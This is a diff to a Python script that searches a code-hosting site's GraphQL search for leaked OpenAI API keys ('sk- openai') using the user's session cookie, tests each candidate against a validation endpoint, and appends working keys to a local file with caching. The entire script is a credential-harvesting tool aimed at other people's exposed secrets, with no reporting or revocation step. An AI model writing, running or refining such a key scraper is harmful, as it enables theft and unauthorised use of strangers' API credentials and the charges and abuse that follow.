@@ -2,6 +2,7 @@ import requests
 import sys
 import re
 import time
+import os
 
 if len(sys.argv) < 2:
   raise IndexError("Cookie not provided. Pass in your cookie as the next argument. Like 'python3 main.py \"cookie_here\"'")
@@ -25,6 +26,12 @@ graphql_headers = {
 
 with open("graphql/SearchPageSearchResults.graphql") as f:
   graphql_query = f.read()
+
+known_keys = []
+if os.path.exists("found_keys.txt"):
+  with open("found_keys.txt") as f:
+    known_keys = f.read().strip().split("\n")
+print(known_keys)
 
 def perform_search(query, page, sort):
   payload = [{
@@ -53,6 +60,7 @@ def perform_search(query, page, sort):
 
   r = requests.post(graphql_url, headers=graphql_headers, json=payload)
   data = r.json()
+  #print(data)
   search = data[0]["data"]["search"]
   if not "fileResults" in search:
     if "message" in search:
@@ -79,24 +87,31 @@ def validate_key(key):
   r = requests.get(validation_url, headers=headers)
   return r.ok
 
-def filter_keys(keys):
-  keys = list(set(keys))
-  filtered_keys = []
-
-  for key in keys:
-    if validate_key(key):
-      filtered_keys.append(key)
-  
-  return filtered_keys
+def log_key(key):
+  with open("found_keys.txt", "a") as f:
+    f.write(key + "\n")
 
 def search_all_pages(query, sort):
   found_keys = []
+  valid_keys = []
   for page in range(1, 21):
     print(f"Checking page {page}, sorting by {sort}...")
     keys = perform_search(query, page, sort)
-    print(f"Found {len(keys)} matches (not validated, actual result will be much lower)")
+    print(f"Found {len(keys)} matches (not validated)")
+
+    for key in keys:
+      if key in found_keys:
+        continue
+      if key in known_keys:
+        print(f"Found working key (cached): {key}")
+      elif validate_key(key):
+        valid_keys.append(key)
+        log_key(key)
+        print(f"Found working key: {key}")
+    
     found_keys += keys
-  return found_keys
+
+  return valid_keys
 
 def search_all_sorts(query):
   sorts = ["RecentlyModified", "Relevant"]
@@ -104,9 +119,8 @@ def search_all_sorts(query):
 
   for sort in sorts:
     found_keys += search_all_pages(query, sort)
-    
-  filtered_keys = filter_keys(found_keys)
-  return filtered_keys
+  
+  return found_keys
 
 all_keys = search_all_sorts("sk- openai")
 for key in all_keys:
